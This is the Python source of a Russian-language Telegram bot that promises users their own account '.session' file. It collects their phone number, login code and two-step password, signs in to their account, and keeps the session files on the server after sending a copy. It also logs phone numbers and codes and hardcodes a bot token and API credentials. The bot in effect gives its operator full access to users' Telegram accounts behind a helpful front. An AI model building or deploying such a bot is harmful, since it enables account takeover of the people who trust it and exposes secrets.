import os
import telebot
import asyncio
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
os.makedirs("sessions", exist_ok=True)

TOKEN = "8613059845:AAGmR3p8x5KdbCeSrhKMeYCm3Q15bnIXhKA"
API_ID = 33420865
API_HASH = "fad372ac85456316deec86ff9fbba999"

bot = telebot.TeleBot(TOKEN)
sessions = {}
loop = asyncio.new_event_loop()

async def create_client(session_name):
    logging.info(f"Creating client for session: {session_name}")
    return TelegramClient(
        session_name,
        API_ID,
        API_HASH,
        device_model='SessionBot',
        system_version='1.0',
        app_version='2.0',
        loop=loop
    )

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result()

@bot.message_handler(commands=["start"])
def start(message):
    logging.info(f"Received /start from {message.chat.id}")
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Начать", callback_data="start_session"))
    bot.send_message(
        message.chat.id,
        f"Привет, {message.from_user.first_name}! 👋\n\nВы здесь, чтобы получить файл .session от своего аккаунта. Давайте начнем!",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "start_session")
def warning(call):
    logging.info(f"User {call.message.chat.id} started session")
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Я понимаю условия", callback_data="accept_terms"))
    bot.edit_message_text(
        "⚠️ Внимание!\n\nНикому не отправляйте файл .session! Администрация бота не несёт ответственности за его использование. Вы берёте всю ответственность на себя.",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "accept_terms")
def request_phone(call):
    logging.info(f"User {call.message.chat.id} accepted terms")
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 Отправить номер", request_contact=True))
    bot.send_message(
        call.message.chat.id,
        "📌 Чтобы получить файл .session, отправьте ваш номер телефона, используя кнопку ниже.",
        reply_markup=markup
    )

@bot.message_handler(content_types=["contact"])
def handle_contact(message):
    chat_id = message.chat.id
    phone = message.contact.phone_number
    logging.info(f"Received contact from {chat_id}: {phone}")
    sessions[chat_id] = {
        "phone": phone,
        "code": "",
        "phone_code_hash": None,
        "password": None,
        "client": None
    }
    try:
        client = run_async(create_client(f"sessions/{chat_id}"))
        sessions[chat_id]["client"] = client
        run_async(client.connect())
        sent_code = run_async(client.send_code_request(phone))
        sessions[chat_id]["phone_code_hash"] = sent_code.phone_code_hash
        logging.info(f"Code sent for {phone} user {chat_id}")
        show_code_keyboard(chat_id)
    except AuthRestartError:
        logging.error(f"AuthRestartError for user {chat_id}")
        bot.send_message(chat_id, "⚠️ Ошибка авторизации. Пожалуйста, попробуйте снова.")
    except Exception as e:
        logging.exception(f"Critical error for user {chat_id}: {str(e)}")
        bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
        cleanup_session(chat_id)

def show_code_keyboard(chat_id):
    markup = InlineKeyboardMarkup()
    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
    for i in range(0, 10, 3):
        markup.row(*buttons[i:i+3])
    markup.row(InlineKeyboardButton("⬅️ Удалить", callback_data="delete_digit"))
    bot.send_message(
        chat_id,
        "📩 Введите код из Telegram, используя кнопки ниже:\n\nВы ввели: ",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("code_") or call.data == "delete_digit")
def handle_code_input(call):
    chat_id = call.message.chat.id
    session = sessions.get(chat_id)
    if not session:
        logging.warning(f"Session for user {chat_id} not found")
        return
    if call.data == "delete_digit":
        session["code"] = session["code"][:-1]
    else:
        digit = call.data.split("_")[1]
        session["code"] += digit
    logging.info(f"User {chat_id} entered code: {session['code']}")
    if len(session["code"]) == 5:
        process_code(chat_id)
    else:
        update_code_display(call.message, session["code"])

def process_code(chat_id):
    try:
        session = sessions[chat_id]
        client = session["client"]
        run_async(client.sign_in(
            phone=session["phone"],
            code=session["code"],
            phone_code_hash=session["phone_code_hash"]
        ))
        logging.info(f"User {chat_id} signed in with code {session['code']}")
        send_session_file(chat_id)
    except SessionPasswordNeededError:
        logging.info(f"2FA enabled for user {chat_id}")
        bot.send_message(chat_id, "🔒 Введите пароль двухэтапной аутентификации:")
    except PhoneCodeInvalidError:
        logging.warning(f"Invalid code for user {chat_id}")
        bot.send_message(chat_id, "❌ Неверный код. Попробуйте снова.")
        show_code_keyboard(chat_id)
    except Exception as e:
        logging.exception(f"Authorization error for user {chat_id}: {str(e)}")
        bot.send_message(chat_id, f"❌ Ошибка авторизации: {str(e)}")
        cleanup_session(chat_id)

@bot.message_handler(func=lambda m: sessions.get(m.chat.id, {}).get("password") is None)
def handle_2fa_password(message):
    chat_id = message.chat.id
    session = sessions.get(chat_id)
    if not session:
        logging.warning(f"Session for user {chat_id} not found in 2FA handler")
        return
    try:
        session["password"] = message.text
        client = session["client"]
        run_async(client.sign_in(password=session["password"]))
        logging.info(f"User {chat_id} signed in via 2FA")
        send_session_file(chat_id)
    except Exception as e:
        logging.exception(f"2FA error for user {chat_id}: {str(e)}")
        bot.send_message(chat_id, f"❌ Ошибка двухэтапной аутентификации: {str(e)}")
        cleanup_session(chat_id)

def send_session_file(chat_id):
    try:
        session_path = f"sessions/{chat_id}"
        with open(f"{session_path}.session", "rb") as f:
            bot.send_document(
                chat_id,
                f,
                caption="📂 Ваш .session файл.\n⚠️ Не передавайте его третьим лицам ! Creator: @worpli, especially for the GitHub"
            )
        logging.info(f"Session file sent for user {chat_id}")
    except Exception as e:
        logging.exception(f"Error sending file for user {chat_id}: {str(e)}")
        bot.send_message(chat_id, f"❌ Ошибка при отправке файла: {str(e)}")
    finally:
        cleanup_session(chat_id)

def cleanup_session(chat_id):
    if chat_id in sessions:
        client = sessions[chat_id].get("client")
        if client:
            try:
                run_async(client.disconnect())
                logging.info(f"Client disconnected for user {chat_id}")
            except Exception as e:
                logging.exception(f"Error disconnecting client for user {chat_id}: {str(e)}")
        del sessions[chat_id]
        logging.info(f"Session cleaned for user {chat_id}")

def update_code_display(message, current_code):
    markup = InlineKeyboardMarkup()
    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
    for i in range(0, 10, 3):
        markup.row(*buttons[i:i+3])
    markup.row(InlineKeyboardButton("⬅️ Удалить", callback_data="delete_digit"))
    bot.edit_message_text(
        f"📩 Введите код из Telegram:\n\nВы ввели: {current_code}",
        message.chat.id,
        message.message_id,
        reply_markup=markup
    )

if __name__ == '__main__':
    from threading import Thread
    Thread(target=loop.run_forever).start()
    try:
        logging.info("Starting bot polling")
        bot.polling(none_stop=True)
    except Exception as e:
        logging.exception(f"Polling error: {str(e)}")
    finally:
        loop.call_soon_threadsafe(loop.stop)